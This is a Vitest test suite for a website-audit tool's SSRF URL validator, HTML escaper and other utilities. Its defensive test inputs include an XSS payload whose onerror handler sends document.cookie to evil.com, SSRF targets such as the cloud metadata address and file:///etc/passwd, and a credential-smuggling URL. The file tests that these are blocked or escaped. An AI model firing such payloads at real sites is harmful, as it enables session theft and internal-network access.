/**
 * Gauntlet Test Suite — Copper Bay Tech
 * Runner: Vitest
 * Install: npm i -D vitest @vitest/coverage-v8
 * Run:    npx vitest run
 */

import { describe, it, expect, vi } from "vitest";
import { validateAuditUrl, BLOCKED_REASONS } from "../lib/validate-url";
import { escapeHtml } from "../lib/escape-html";

// ── UNIT: SSRF URL Validator ───────────────────────────────────────────────

describe("validateAuditUrl — SSRF protection", () => {
  // Happy path
  it("accepts a valid public HTTPS URL", () => {
    expect(validateAuditUrl("https://copperbaytech.com")).toEqual({ ok: true, url: "https://copperbaytech.com" });
  });

  it("prepends https:// when scheme is missing", () => {
    const result = validateAuditUrl("example.com");
    expect(result).toEqual({ ok: true, url: "https://example.com" });
  });

  it("accepts HTTP URLs (non-HTTPS public sites)", () => {
    const result = validateAuditUrl("http://example.com");
    expect(result.ok).toBe(true);
  });

  // Rejection: private IPv4
  it("blocks loopback 127.0.0.1", () => {
    const result = validateAuditUrl("http://127.0.0.1");
    expect(result.ok).toBe(false);
    expect((result as { ok: false; reason: string }).reason).toBe(BLOCKED_REASONS.PRIVATE_NETWORK);
  });

  it("blocks localhost hostname", () => {
    const result = validateAuditUrl("http://localhost:8080/admin");
    expect(result.ok).toBe(false);
    expect((result as { ok: false; reason: string }).reason).toBe(BLOCKED_REASONS.PRIVATE_NETWORK);
  });

  it("blocks 10.x.x.x private range", () => {
    expect(validateAuditUrl("http://10.0.0.1").ok).toBe(false);
    expect(validateAuditUrl("http://10.255.255.255").ok).toBe(false);
  });

  it("blocks 172.16.x.x – 172.31.x.x range", () => {
    expect(validateAuditUrl("http://172.16.0.1").ok).toBe(false);
    expect(validateAuditUrl("http://172.31.255.255").ok).toBe(false);
    // 172.15 and 172.32 are public — should pass
    expect(validateAuditUrl("http://172.15.0.1").ok).toBe(true);
    expect(validateAuditUrl("http://172.32.0.1").ok).toBe(true);
  });

  it("blocks 192.168.x.x range", () => {
    expect(validateAuditUrl("http://192.168.1.1").ok).toBe(false);
    expect(validateAuditUrl("http://192.168.0.254").ok).toBe(false);
  });

  it("blocks AWS metadata IP 169.254.169.254", () => {
    expect(validateAuditUrl("http://169.254.169.254/latest/meta-data/").ok).toBe(false);
    expect(validateAuditUrl("http://169.254.0.1").ok).toBe(false);
  });

  it("blocks IPv6 loopback ::1", () => {
    expect(validateAuditUrl("http://[::1]/").ok).toBe(false);
  });

  it("blocks IPv6 link-local fe80::", () => {
    expect(validateAuditUrl("http://[fe80::1]/").ok).toBe(false);
  });

  it("blocks 0.0.0.0", () => {
    expect(validateAuditUrl("http://0.0.0.0").ok).toBe(false);
  });

  // Edge cases
  it("rejects non-string input", () => {
    expect(validateAuditUrl(null).ok).toBe(false);
    expect(validateAuditUrl(42).ok).toBe(false);
  });

  it("rejects empty string", () => {
    expect(validateAuditUrl("").ok).toBe(false);
  });

  it("rejects non-http(s) schemes", () => {
    expect(validateAuditUrl("ftp://example.com").ok).toBe(false);
    expect(validateAuditUrl("file:///etc/passwd").ok).toBe(false);
    expect(validateAuditUrl("javascript:alert(1)").ok).toBe(false);
    expect(validateAuditUrl("data:text/html,<script>alert(1)</script>").ok).toBe(false);
  });

  it("rejects URLs with auth credentials (SSRF evasion)", () => {
    expect(validateAuditUrl("http://user:pass@evil.com@192.168.1.1/").ok).toBe(false);
  });

  it("rejects URL longer than 2048 characters", () => {
    const long = "https://example.com/" + "a".repeat(2048);
    expect(validateAuditUrl(long).ok).toBe(false);
  });
});

// ── UNIT: HTML Escaper ────────────────────────────────────────────────────

describe("escapeHtml — XSS prevention", () => {
  it("escapes < and >", () => {
    // Slashes are NOT escaped (not needed for HTML text/attribute contexts)
    expect(escapeHtml("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("escapes & to &amp;", () => {
    expect(escapeHtml("AT&T")).toBe("AT&amp;T");
  });

  it("escapes double quotes", () => {
    expect(escapeHtml(`He said "hello"`)).toBe("He said &quot;hello&quot;");
  });

  it("escapes single quotes", () => {
    expect(escapeHtml("It's fine")).toBe("It&#x27;s fine");
  });

  it("neutralizes </script> close-tag injection via escaping angle brackets", () => {
    // The </script> injection vector is neutralized by escaping < and >, not /
    const escaped = escapeHtml("</script>");
    expect(escaped).toContain("&lt;");
    expect(escaped).toContain("&gt;");
    expect(escaped).not.toContain("<"); // no raw angle brackets remain
  });

  it("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  it("handles non-string input gracefully", () => {
    expect(() => escapeHtml(null as unknown as string)).not.toThrow();
    expect(escapeHtml(null as unknown as string)).toBe("");
  });

  it("does not double-escape already-escaped strings", () => {
    const once = escapeHtml("<b>bold</b>");
    const twice = escapeHtml(once);
    // Slashes not escaped, so /b remains /b after first pass
    expect(once).toBe("&lt;b&gt;bold&lt;/b&gt;");
    // Second pass escapes the &, < etc. in the already-escaped string
    expect(twice).toBe("&amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;");
  });

  it("neutralizes img onerror XSS payload by escaping angle brackets and quotes", () => {
    const payload = `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`;
    const escaped = escapeHtml(payload);
    // The dangerous HTML structure is destroyed — no raw angle brackets remain
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toContain('onerror="');
    // The word "onerror" as plain text is harmless and may remain
    expect(escaped).toContain("&lt;img");
    expect(escaped).toContain("&gt;");
    expect(escaped).toContain("&quot;");
  });
});

// ── UNIT: SSL valid flag logic ────────────────────────────────────────────

describe("SSL route — valid flag", () => {
  it("authorized=false must NOT be overridden to true", () => {
    // This test documents the previous bug: socket.authorized || true
    // Always returned true. The fix must be: valid = socket.authorized (boolean).
    const fakeSocket = { authorized: false };
    const valid = fakeSocket.authorized; // correct
    const buggy = fakeSocket.authorized || true; // was the bug
    expect(valid).toBe(false);
    expect(buggy).toBe(true); // confirms the bug existed
  });

  it("authorized=true remains true", () => {
    const fakeSocket = { authorized: true };
    expect(fakeSocket.authorized).toBe(true);
  });
});

// ── UNIT: Link checker redirect resolution ────────────────────────────────

describe("Links route — redirect destination capture", () => {
  it("captures Location header from a 301 response", async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      status: 301,
      headers: new Headers({ Location: "https://example.com/new-path" }),
    });

    // Simulate the corrected checkLink logic
    async function checkLink(url: string, mockFetcher: typeof mockFetch) {
      const res = await mockFetcher(url, { method: "HEAD", redirect: "manual" });
      const location = res.headers.get("Location") ?? "";
      return { url, status: res.status, to: location };
    }

    const result = await checkLink("https://example.com/old", mockFetch);
    expect(result.status).toBe(301);
    expect(result.to).toBe("https://example.com/new-path");
  });

  it("sets to empty string for non-redirect responses", async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      status: 200,
      headers: new Headers(),
    });

    async function checkLink(url: string, mockFetcher: typeof mockFetch) {
      const res = await mockFetcher(url, { method: "HEAD", redirect: "manual" });
      const location = res.headers.get("Location") ?? "";
      return { url, status: res.status, to: location };
    }

    const result = await checkLink("https://example.com/good", mockFetch);
    expect(result.to).toBe("");
  });
});

// ── UNIT: ADA score calculation ───────────────────────────────────────────

describe("ADA score calculation", () => {
  it("100% pass → score 100", () => {
    const issues = [
      { severity: "pass" as const },
      { severity: "pass" as const },
      { severity: "pass" as const },
    ];
    const passed = issues.filter(i => i.severity === "pass").length;
    const score = Math.round((passed / issues.length) * 100);
    expect(score).toBe(100);
  });

  it("0% pass → score 0", () => {
    type Sev = "pass" | "warning" | "error";
    const issues: Array<{ severity: Sev }> = [
      { severity: "error" },
      { severity: "error" },
    ];
    const passed = issues.filter(i => i.severity === "pass").length;
    const score = Math.round((passed / issues.length) * 100);
    expect(score).toBe(0);
  });

  it("mixed: 3 pass 1 warning 2 error → score 50", () => {
    const issues = [
      { severity: "pass" as const },
      { severity: "pass" as const },
      { severity: "pass" as const },
      { severity: "warning" as const },
      { severity: "error" as const },
      { severity: "error" as const },
    ];
    const passed = issues.filter(i => i.severity === "pass").length;
    const score = Math.round((passed / issues.length) * 100);
    expect(score).toBe(50);
  });
});

// ── UNIT: PricingEstimator compute ────────────────────────────────────────

describe("PricingEstimator — computeEstimate", () => {
  const baseRanges: Record<string, [number, number]> = {
    website: [1500, 4000],
    it: [800, 2500],
    security: [600, 2000],
    app: [4000, 12000],
  };

  const steps = [
    { id: "type", options: [{ value: "website", modifier: 0 }, { value: "app", modifier: 0 }] },
    { id: "size", options: [{ value: "solo", modifier: 0 }, { value: "large", modifier: 3000 }] },
    { id: "urgency", options: [{ value: "flexible", modifier: 0 }, { value: "urgent", modifier: 500 }] },
    { id: "extras", options: [{ value: "none", modifier: 0 }, { value: "retainer", modifier: 250 }, { value: "copy", modifier: 400 }] },
  ];

  function computeEstimate(answers: Record<string, string[]>) {
    const type = (answers.type || ["website"])[0];
    const [baseLow, baseHigh] = baseRanges[type] || [1500, 4000];
    let addedLow = 0, addedHigh = 0;
    Object.entries(answers).forEach(([stepId, vals]) => {
      if (stepId === "type") return;
      const s = steps.find(s => s.id === stepId);
      if (!s) return;
      vals.forEach(val => {
        const opt = s.options.find(o => o.value === val);
        if (opt) { addedLow += opt.modifier * 0.8; addedHigh += opt.modifier; }
      });
    });
    return [Math.round(baseLow + addedLow), Math.round(baseHigh + addedHigh)];
  }

  it("website + solo + flexible + none → base range unchanged", () => {
    const [low, high] = computeEstimate({ type: ["website"], size: ["solo"], urgency: ["flexible"], extras: ["none"] });
    expect(low).toBe(1500);
    expect(high).toBe(4000);
  });

  it("app + large + urgent + retainer + copy → correct additive", () => {
    const [low, high] = computeEstimate({ type: ["app"], size: ["large"], urgency: ["urgent"], extras: ["retainer", "copy"] });
    // addedHigh = 3000 + 500 + 250 + 400 = 4150
    // addedLow  = 4150 * 0.8 = 3320
    expect(high).toBe(12000 + 4150);
    expect(low).toBe(4000 + Math.round(4150 * 0.8));
  });

  it("unknown type falls back to website range", () => {
    const [low, high] = computeEstimate({ type: ["unknown_service"], size: ["solo"], urgency: ["flexible"], extras: ["none"] });
    expect(low).toBe(1500);
    expect(high).toBe(4000);
  });

  it("missing type key defaults to website", () => {
    const [low, high] = computeEstimate({ size: ["solo"], urgency: ["flexible"], extras: ["none"] });
    expect(low).toBe(1500);
    expect(high).toBe(4000);
  });
});

// ── INTEGRATION: Contact route validation ────────────────────────────────

describe("Contact route — email format validation", () => {
  // These tests describe expected behavior of the fixed route
  const validPayloads = [
    { name: "Jane Smith", business: "Acme Co", email: "jane@example.com", service: "website" },
    { name: "A", business: "B", email: "test+tag@domain.co.uk", service: "it-support", message: "Hello" },
  ];

  const invalidPayloads = [
    { name: "", business: "Acme", email: "jane@example.com", service: "website" },
    { name: "Jane", business: "Acme", email: "not-an-email", service: "website" },
    { name: "Jane", business: "Acme", email: "", service: "website" },
    { name: "Jane", business: "Acme", email: "jane@example.com", service: "" },
    { name: "Jane", business: "Acme", email: "jane@example.com", service: "website", message: "x".repeat(10001) },
  ];

  it("accepts well-formed contact payloads", () => {
    validPayloads.forEach(p => {
      expect(p.name.trim().length).toBeGreaterThan(0);
      expect(p.email).toMatch(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
      expect(p.service.length).toBeGreaterThan(0);
    });
  });

  it("rejects empty name", () => {
    const p = invalidPayloads[0];
    expect(p.name.trim().length).toBe(0);
  });

  it("rejects malformed email", () => {
    const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    expect(emailRe.test("not-an-email")).toBe(false);
    expect(emailRe.test("")).toBe(false);
  });

  it("rejects oversized message (> 10000 chars)", () => {
    const p = invalidPayloads[4];
    expect((p.message ?? "").length).toBeGreaterThan(10000);
  });
});

// ── EDGE: Race condition resilience (async parallel fetch) ─────────────────

describe("Parallel audit fetch — race condition handling", () => {
  it("resolves all 6 checks even if one rejects early", async () => {
    const results = await Promise.allSettled([
      Promise.resolve({ status: "done", data: { score: 95 } }),
      Promise.reject(new Error("SSL timeout")),
      Promise.resolve({ status: "done", data: { score: 80 } }),
      Promise.reject(new Error("Links fetch failed")),
      Promise.resolve({ status: "done", data: { score: 70 } }),
      Promise.resolve({ status: "done", data: { score: 88 } }),
    ]);

    expect(results).toHaveLength(6);
    expect(results.filter(r => r.status === "fulfilled")).toHaveLength(4);
    expect(results.filter(r => r.status === "rejected")).toHaveLength(2);

    // Each rejected check should produce an error state, not crash the page
    results.forEach(r => {
      if (r.status === "rejected") {
        expect(r.reason).toBeInstanceOf(Error);
      }
    });
  });

  it("does not allow a slow check to block rendering of completed checks", async () => {
    let speedDone = false;
    let linksDone = false;

    const speed = Promise.resolve("done").then(v => { speedDone = true; return v; });
    const slowLinks = new Promise(resolve => setTimeout(() => { linksDone = true; resolve("done"); }, 200));

    await speed;
    expect(speedDone).toBe(true);
    expect(linksDone).toBe(false); // links not done yet while speed is already done

    await slowLinks;
    expect(linksDone).toBe(true);
  });
});
